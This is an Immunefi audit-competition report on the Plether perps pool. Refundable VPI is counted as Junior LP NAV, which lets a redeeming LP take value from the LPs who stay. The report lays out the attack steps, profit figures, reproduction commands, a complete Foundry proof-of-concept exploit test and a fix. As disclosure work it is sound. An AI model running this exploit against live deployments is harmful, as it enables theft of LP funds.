# \#99620 [SC-Critical] Refundable VPI is booked into Junior NAV before the trader can reclaim it

**Submitted on Nov 14th 2026 at 14:30:36 UTC by @Norah for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99620
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a trader opens a position that increases skew, they pay a VPI (virtual price impact) charge in USDG. The pool books that cash as revenue immediately, and it raises the NAV used to price LP redemptions in the same hourly epoch.

The cash is not revenue. When the position closes and skew returns, the lifetime clamp refunds the trader what they paid, minus the close fee, out of pool cash. So for as long as the position is open, NAV is inflated by money the pool may have to give back.

A Junior LP who redeems during that window is paid their share of the refundable VPI. The juniors who remain pay the refund when the position closes. One LP's exit directly cuts another LP's redeemable USDG, and no attacker is needed for that to happen. A trader who is also a Junior LP can run both legs and keep the difference, every epoch.

## Vulnerability Details

1. The VPI charge on an open is part of `tradeCostAssets`. `CfdEngineSettlementSidecar.executeOpen` (`CfdEngineSettlementSidecar.sol:452-463`) routes it to the pool via `recordClaimantInflow(..., Revenue, CashArrived)`, which does `accountedAssets += amount` (`HousePool.sol:641`). The cash is now pool NAV.
2. LP share pricing runs through `buildReconcileSnapshot` (`HousePoolAccountingLib.sol:60-78`): `distributable = physicalAssets + positive terminal delta − traderClaims`. There is no term for refundable VPI. The function has no input that could express one.
3. The waterfall routes the surplus into junior principal (`HousePoolWaterfallAccountingLib.sol:140-165`), and the epoch settlement in the same call prices redemptions from that principal (`HousePool.sol:840` onward).
4. On close, the lifetime clamp keeps the trader's lifetime VPI non-negative (`CloseAccountingLib.sol:112-118`), so the rebate equals what was charged, and the planner nets the close fee against it (`CfdEnginePlanLib.sol:1042-1060`). Payment comes from pool cash, capped only by pool cash net of trader claims (`CfdEnginePlanLib.sol:973-977`; the payout itself at `CfdEngineSettlementSidecar.sol:621-623`).

The pool is therefore holding a contingent liability of up to Σ positive `vpiAccrued` over open positions, and LP pricing ignores it. The protocol already handles the opposite case: traders whose lifetime VPI is negative must post a dedicated reserve that LP pricing excludes, and the clamp comment at `CloseAccountingLib.sol:112-115` exists specifically to stop LP-side sandwich extraction on the negative leg. There is no matching protection for positive, still-refundable VPI.

## Attack path
Release parameters: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18 (an open from flat to the skew cap pays exactly 20 bps of notional), execution fee 4 bps.

1. Pool: Senior 4,000,000; Junior split attacker 3,600,000 (f ≈ 0.6) and victim 2,400,000. Depth 10,002,000.
2. During an epoch, the attacker requests a full junior redemption. It matures at the next hourly boundary.
3. Before that epoch settles, the attacker opens a LONG of 4,000,800 tokens at 1.00: exactly the 40% skew cap. VPI charged is V = 8,001.60 (20.00 bps of notional), now inside pool NAV.
4. Anyone settles the LP epoch. The attacker's redemption is funded at the inflated NAV, an uplift of f·V ≈ 4,800.
5. The attacker closes at the same price. The clamp refunds V − 1,600.32 close fee = 6,401.28, taken from pool cash that is now mostly the victim's.
6. The victim redeems later and receives that much less.

The passive variant needs no attacker at all. Any junior redemption settling while a skew-increasing position is open is overpaid by the redeemer's share of V, and the remaining juniors pay it back on close.

## Impact Details
Measured in the PoC below.

- Attacker's redemption: 3,604,719.79 versus 3,599,919.62 in the control. Uplift 4,800.17, which is f·V.
- Victim's later fully funded redemption: 2,396,735.68 versus 2,399,934.24. That is 3,198.57 fewer USDG actually received, for identical shares.
- Passive variant: an honest redeemer receives 2,403,170.91 against a 2,399,970.77 baseline. Overpaid by 3,200.15, at the expense of the juniors who stay.

The take scales with the attacker's junior share and pool depth, and the attacker can supply the junior capital too: junior deposits are uncapped, so a fresh wallet can grow its share until free-withdrawal reserves (its own side liability) bind. At a 0.78 attacker share, reachable against a 4M honest junior tranche with 14M of attacker capital, the same cycle nets on the order of 7,000 USDG. Repeatable each epoch.

## Why this is not a known issue

The registry documents the cash mechanics (positive VPI increases pool assets: SECURITY.md VPI limitations, WHITEPAPER L411 and L811) and excludes *anticipated* VPI from terminal NAV (SECURITY.md:872, ACCOUNTING_SPEC:1064-1066). Anticipated means future VPI. This report is about VPI already collected and still refundable, which does inflate NAV. The clamp note at SECURITY.md:1443 covers the trader leg, and that leg is indeed neutral here.

SCAN-31 (depth manipulation amplifying a close rebate) is a different mechanism and a different state. In this bug the rebate is the same with or without any redemption (6,394.88 versus 6,401.28, a 0.1% difference); the harm comes from NAV booking V as revenue, and the passive variant involves no trader action beyond one ordinary open. No registry entry describes an LP-to-LP transfer through redemption pricing.

## Recommendation

Stop pricing refundable VPI as distributable. In `buildReconcileSnapshot`, subtract Σ max(`vpiAccrued`, 0) over open positions from `distributable`. Or route open-VPI charges into a dedicated impact reserve that LP pricing excludes until the position closes or liquidates, mirroring the existing negative-VPI reserve. Either way, recognize VPI as revenue only when the lifetime clamp can no longer return it.

## References
Add any relevant links to documentation or code


## Proof of Concept

The PoC is a single Foundry test file with three tests. The main test runs the attack and the no-attack control on one snapshot of the same clock, and measures real USDG paid out through the public redemption path. The other two isolate the passive variant: no attacker, only an open position and an honest redeemer. Everything runs on the repository's own fixtures (`BasePerpTest`, its mock settlement token, and the Router-prank order helpers used throughout the project's suite) plus public vault entrypoints. No file under `src/` is modified, and there is no fuzzing: every test is zero-argument and deterministic.

To reproduce:

```bash
# 1. Frozen checkout (Foundry Forge 1.5.1, Solidity 0.8.35, via-IR)
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8

# 2. Save the source at the end of this report as packages/perps/test/poc/Crit01_RefundableVpiNav.t.sol

# 3. Run it
forge test --root packages/perps --match-path 'test/poc/Crit01_RefundableVpiNav.t.sol' -vv
```

The first compile covers the whole perps package under via-IR and takes several minutes. To compile only the PoC directory instead, prefix the same command with `FOUNDRY_TEST=test/poc` and add `--skip script`, which is how the numbers below were produced.

Expected output, all passing:

```

[PASS] test_PLETHER_Crit01_AttackerRedemptionOverpaid_VictimLosesUsdg()
  attacker redemption, attack : 3604719.794110
  attacker redemption, control: 3599919.624382
  victim redemption, attack : 2396735.677674
  victim redemption, control: 2399934.243388
  victim USDG shortfall: 3198.565714
[PASS] test_PLETHER_Crit01_Passive_WithTradeOpen_RedemptionOverpaid()
  honest junior redemption, trade open: 2403170.914495
[PASS] test_PLETHER_Crit01_Passive_NoTrade_Baseline()
  honest junior redemption, no trade : 2399970.768871
```

Reading the output: the attacker's redemption gains 4,800.17 over the control, its 60% junior share of the 8,001.60 refundable VPI. After the attacker closes and reclaims V minus the fee, the victim redeems in the following epoch and receives 3,198.57 fewer USDG than in the control, for identical shares. The passive pair shows the same transfer with no attacker present: 2,403,170.91 paid against a 2,399,970.77 baseline.

### PoC source (`packages/perps/test/poc/Crit01_RefundableVpiNav.t.sol`)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Crit 01: the VPI charged on a skew-increasing open is booked into pool NAV
///         immediately, although the lifetime clamp will refund it (minus the close fee)
///         when the position closes. A junior LP who redeems while the position is open
///         is paid its share of that refundable VPI; the juniors who remain pay for it.
contract PocCrit01RefundableVpiNavTest is BasePerpTest {
    address internal constant ATTACKER = address(0xA77AC);
    address internal constant VICTIM = address(0x91C7);

    // Release parameters (packages/perps/DEPLOYMENT.md).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Attack: junior LP (60% of junior) requests a full redemption, opens a
    ///      max-skew LONG after the request cutoff, lets the epoch settle at the inflated
    ///      NAV, claims, then closes. Control: same clock, no trade.
    function test_PLETHER_Crit01_AttackerRedemptionOverpaid_VictimLosesUsdg() public {
        _setupPoolAndTraders();
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        uint256 victimShares = juniorVault.balanceOf(VICTIM);

        uint256 snap = vm.snapshotState();

        // ---- Attack branch ----
        uint256 redeemId = _requestJuniorRedeem(ATTACKER, attackerShares);
        _warpToRedeemEpoch(redeemId);

        _open(ATTACKER, CfdTypes.Side.LONG, 4_000_800e18, 50_000e6, 1e8); // exactly the 40% skew cap

        _settleLpEpochForTest();
        uint256 attackAttackerUsdg = _claimJuniorRedeem(ATTACKER, redeemId, attackerShares);

        _close(ATTACKER, CfdTypes.Side.LONG, 4_000_800e18, 1e8); // reclaims V minus the close fee

        uint256 attackVictimUsdg = _redeemAllJunior(VICTIM, victimShares);

        // ---- Control branch: identical clock, no trade ----
        vm.revertToState(snap);
        redeemId = _requestJuniorRedeem(ATTACKER, attackerShares);
        _warpToRedeemEpoch(redeemId);
        _settleLpEpochForTest();
        uint256 controlAttackerUsdg = _claimJuniorRedeem(ATTACKER, redeemId, attackerShares);
        uint256 controlVictimUsdg = _redeemAllJunior(VICTIM, victimShares);

        emit log_named_decimal_uint("attacker redemption, attack ", attackAttackerUsdg, 6);
        emit log_named_decimal_uint("attacker redemption, control", controlAttackerUsdg, 6);
        emit log_named_decimal_uint("victim redemption, attack ", attackVictimUsdg, 6);
        emit log_named_decimal_uint("victim redemption, control", controlVictimUsdg, 6);

        // Attacker's redemption is overpaid by its junior share of the refundable VPI.
        uint256 uplift = attackAttackerUsdg - controlAttackerUsdg;
        assertGt(uplift, 4_700e6, "attacker redemption must capture most of V (f ~ 0.6)");
        assertLt(uplift, 4_900e6, "uplift is bounded by f * V ~ 4,800");

        // The victim's later, fully funded redemption pays strictly fewer USDG tokens.
        uint256 victimLoss = controlVictimUsdg - attackVictimUsdg;
        assertGt(victimLoss, 3_000e6, "victim must lose more than 3,000 USDG vs control");
        emit log_named_decimal_uint("victim USDG shortfall", victimLoss, 6);
    }

    /// @dev Passive variant, branch A: an unrelated trader holds the max-skew position
    ///      across the settlement and an honest junior (40% of junior) redeems.
    function test_PLETHER_Crit01_Passive_WithTradeOpen_RedemptionOverpaid() public {
        _setupPoolAndTraders();
        uint256 victimShares = juniorVault.balanceOf(VICTIM);

        _open(TRADER, CfdTypes.Side.LONG, 4_000_800e18, 50_000e6, 1e8);
        uint256 redeemId = _requestJuniorRedeem(VICTIM, victimShares);
        _warpToRedeemEpoch(redeemId);
        _settleLpEpochForTest();
        uint256 withTradeUsdg = _claimJuniorRedeem(VICTIM, redeemId, victimShares);

        emit log_named_decimal_uint("honest junior redemption, trade open", withTradeUsdg, 6);
        // Baseline (no trade) is ~2,399,934 USDG for a 2.4M deposit; the open position's
        // refundable VPI (8,001.60) overpays the 40% junior by ~3,200 USDG.
        assertGt(withTradeUsdg, 2_403_100e6, "redeemer must be overpaid by ~ f * V");
    }

    /// @dev Passive variant, branch B: identical clock, no trade (baseline).
    function test_PLETHER_Crit01_Passive_NoTrade_Baseline() public {
        _setupPoolAndTraders();
        uint256 victimShares = juniorVault.balanceOf(VICTIM);

        uint256 redeemId = _requestJuniorRedeem(VICTIM, victimShares);
        _warpToRedeemEpoch(redeemId);
        _settleLpEpochForTest();
        uint256 noTradeUsdg = _claimJuniorRedeem(VICTIM, redeemId, victimShares);

        emit log_named_decimal_uint("honest junior redemption, no trade ", noTradeUsdg, 6);
        assertApproxEqAbs(noTradeUsdg, 2_399_934e6, 2_000e6, "baseline for the same clock");
    }

    address internal constant TRADER = address(0x7DA7E);

    /// @dev Senior 4M; junior split ATTACKER 3.6M / VICTIM 2.4M (plus 1k seeds). This
    ///      matches the report's pool depth of 10,002,000 USDG.
    function _setupPoolAndTraders() private {
        _fundSenior(address(this), 4_000_000e6);
        _fundJunior(ATTACKER, 3_600_000e6);
        _fundJunior(VICTIM, 2_400_000e6);
        _fundTrader(ATTACKER, 100_000e6);
        _fundTrader(TRADER, 100_000e6);
        // 1h deposit cooldown before redemption requests are allowed.
        vm.warp(block.timestamp + 1 hours + 1);
    }

    function _requestJuniorRedeem(address lp, uint256 shares) private returns (uint256 requestId) {
        vm.prank(lp);
        requestId = juniorVault.requestRedeem(shares, lp, lp);
    }

    function _warpToRedeemEpoch(uint256 requestId) private {
        (uint256 epoch,) = juniorVault.getRequestEpochWindow();
        uint256 target = pool.lpEpochStart(epoch) + 1;
        if (target <= block.timestamp) {
            // The queued request already matured; settle one full epoch later.
            target = block.timestamp + 1 hours + 1;
        }
        vm.warp(target);
        // Keep the engine mark fresh for the settlement. The optimizer caches block fields
        // within a call frame even across cheatcodes, so read the time through the VM.
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, uint64(vm.getBlockTimestamp()));
    }

    function _claimJuniorRedeem(address lp, uint256 requestId, uint256 shares) private returns (uint256 usdg) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        usdg = juniorVault.claimRedeem(requestId, claimable, lp, lp);
        assertGt(usdg, 0, "redemption must be funded");
        assertLe(usdg, shares * 2, "sanity");
    }

    /// @dev Full-balance junior redemption in the next epoch, claimed in USDG.
    function _redeemAllJunior(address lp, uint256 shares) private returns (uint256 usdg) {
        uint256 requestId = _requestJuniorRedeem(lp, shares);
        _warpToRedeemEpoch(requestId);
        _settleLpEpochForTest();
        usdg = _claimJuniorRedeem(lp, requestId, shares);
    }
}
```
